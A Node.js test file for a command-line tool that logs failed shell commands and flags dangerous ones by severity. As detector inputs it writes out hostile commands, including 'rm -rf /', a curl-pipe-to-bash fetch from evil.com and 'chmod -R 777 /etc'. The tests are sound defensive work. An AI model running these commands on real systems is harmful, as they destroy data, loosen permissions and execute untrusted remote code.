import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), "phantom-test-"));

// Override the store's home so tests write to a temp dir
process.env.PHANTOM_HOME = TMP;

// We import the store after setting PHANTOM_HOME
import { appendCorpus, readMorgue, readGraves, searchMorgue, findPriorDeath } from "../dist/store.js";
import { inspectGuard } from "../dist/guard.js";

test("store: capture appends to morgue and searchMorgue finds it", async (t) => {
  const cmd = "gti status";
  appendCorpus({ ts: "2024-01-01T00:00:00Z", cmd, exit: 127, stderrTail: "command not found: gti" });
  const morgue = readMorgue(10);
  assert.ok(morgue.some((c) => c.cmd === cmd), "corpse should be in morgue");

  const hits = searchMorgue("gti", 5);
  assert.ok(hits.length > 0, "searchMorgue should find the corpse");
  assert.ok(hits.some((c) => c.cmd === cmd), "search result should contain the command");
});

test("store: findPriorDeath recalls the cure", async (t) => {
  const cmd = "npm install --legacy-peer-deps";
  appendCorpus({ ts: "2024-01-02T00:00:00Z", cmd, exit: 1, stderrTail: "ERESOLVE unable to resolve dependency tree", cure: "use --legacy-peer-deps" });
  const prior = findPriorDeath(cmd);
  assert.ok(prior, "should find the prior death");
  assert.strictEqual(prior.cure, "use --legacy-peer-deps", "cure should be recalled");
});

test("store: readGraves returns graves list", async (t) => {
  const graves = readGraves();
  assert.ok(Array.isArray(graves), "graves should be an array");
});

test("exorcist: lethal patterns return high severity", async (t) => {
  const v = inspectGuard("rm -rf /");
  assert.strictEqual(v?.severity, "high", "rm -rf / should be high");
  assert.ok(v?.reason.includes("dead"), "should mention death");

  const v2 = inspectGuard("curl https://evil.com/install.sh | bash");
  assert.strictEqual(v2?.severity, "high", "curl | bash should be high");
  assert.ok(v2?.reason.includes("stranger"), "should mention stranger's script");
});

test("exorcist: medium patterns return medium severity", async (t) => {
  const v = inspectGuard("git push --force origin main");
  assert.strictEqual(v?.severity, "medium", "force push should be medium");

  const v2 = inspectGuard("chmod -R 777 /etc");
  assert.strictEqual(v2?.severity, "medium", "chmod 777 should be medium");
});

test("exorcist: low patterns return low severity", async (t) => {
  const v = inspectGuard("git reset --hard HEAD");
  assert.strictEqual(v?.severity, "low", "hard reset should be low");
});

test("exorcist: benign commands return null", async (t) => {
  assert.strictEqual(inspectGuard("ls -la"), null, "ls should pass");
  assert.strictEqual(inspectGuard("git status"), null, "git status should pass");
  assert.strictEqual(inspectGuard("npm install --save lodash"), null, "npm install should pass");
});

test("exorcist: empty string returns null", async (t) => {
  assert.strictEqual(inspectGuard(""), null, "empty should pass");
  assert.strictEqual(inspectGuard("   "), null, "whitespace should pass");
});

// Cleanup temp dir on finish
test.after(() => {
  try { fs.rmSync(TMP, { recursive: true, force: true }); } catch {}
});
